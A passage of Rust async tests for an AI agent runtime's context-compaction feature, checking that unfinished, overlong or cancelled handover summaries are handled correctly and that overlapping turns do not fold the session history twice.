            started: Arc::clone(&started),
            handovers: Arc::clone(&handovers),
        },
        ToolRegistry::default(),
        config,
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    stall.store(true, Ordering::SeqCst);
    let mut first = runtime.submit_user("turn A").await;
    started.notified().await;
    // The next prompt begins while turn A waits on its summarizer: its token
    // is cancelled, and its loop leaves the fold after B has begun.
    runtime.begin_turn("turn B").await;
    drain(&mut first).await;
    stall.store(false, Ordering::SeqCst);
    let before = *handovers.lock().unwrap();
    let mut second = runtime.drive_turn().await;
    let events = drain(&mut second).await;
    assert_eq!(
        *handovers.lock().unwrap() - before,
        1,
        "turn B tried its own threshold fold: {events:?}"
    );
}

/// A summarizer stream that stops without its closing chunk ended mid-reply:
/// the fragment is not folded as if it were a summary.
#[tokio::test]
async fn a_summary_stream_that_never_finished_is_no_summary() {
    let (client, _handovers) = HandoverClient::new(|_| {
        Ok(vec![AgentEvent::TextDelta {
            text: "# handover\n## 已完成 / Done so far\n- half of the".to_string(),
        }])
    });
    let runtime = AgentRuntime::with_config(
        client,
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let before = runtime.session_messages().await;
    let outcome = compact(&runtime, None).await;
    assert!(
        matches!(&outcome, CompactNowOutcome::Failed(reason) if reason.contains("ended before")),
        "{outcome:?}"
    );
    assert_eq!(runtime.session_messages().await, before);
}

/// A summary past the length cap keeps its cut-short note inside the cap, so
/// the next fold — which carries the summary clipped to that cap — keeps it.
#[tokio::test]
async fn the_cut_short_note_fits_inside_the_cap() {
    let (client, _handovers) = HandoverClient::new(|_| {
        Ok(handover_reply(&format!(
            "# handover\n{}",
            "- 很长的一行事实\n".repeat(3_000)
        )))
    });
    let runtime = AgentRuntime::with_config(
        client,
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let report = folded(compact(&runtime, None).await);
    assert!(report.cut_short);
    assert!(
        report.summary.chars().count() <= crate::compaction::MAX_HANDOVER_SUMMARY_CHARS,
        "{} chars",
        report.summary.chars().count()
    );
    assert!(
        report
            .summary
            .ends_with(crate::compaction::HANDOVER_CUT_SHORT_NOTE)
    );
}

/// A cancel that lands while the summary is finishing still means "stop":
/// the summary that came back with it is not folded in.
#[tokio::test]
async fn a_cancel_as_the_summary_finishes_folds_nothing() {
    struct CancellingSummaryClient {
        cancel: tokio_util::sync::CancellationToken,
    }

    #[async_trait::async_trait]
    impl LlmClient for CancellingSummaryClient {
        fn provider_name(&self) -> &'static str {
            "cancelling"
        }

        fn model(&self) -> &str {
            "cancelling"
        }

        async fn stream_chat(&self, request: ChatRequest) -> AgentResult<AgentEventStream> {
            let summarizer = is_handover_request(&request);
            let cancel = self.cancel.clone();
            let stream = try_stream! {
                if summarizer {
                    yield AgentEvent::TextDelta { text: "# handover".to_string() };
                    // The press lands in the same poll that delivers the end
                    // of the summary.
                    cancel.cancel();
                } else {
                    yield AgentEvent::TextDelta { text: "ok".to_string() };
                }
                yield AgentEvent::Done { usage: None };
            };
            Ok(Box::pin(stream))
        }
    }

    let cancel = tokio_util::sync::CancellationToken::new();
    let runtime = AgentRuntime::with_config(
        CancellingSummaryClient {
            cancel: cancel.clone(),
        },
        ToolRegistry::default(),
        crate::config::AgentConfig::builtin(),
    );
    for index in 0..6 {
        let mut rx = runtime.submit_user(format!("prompt {index}")).await;
        drain(&mut rx).await;
    }
    let before = runtime.session_messages().await;
    let outcome = runtime.compact_now(None, &cancel).await;
    assert_eq!(outcome, CompactNowOutcome::Cancelled);
    assert_eq!(runtime.session_messages().await, before);
}
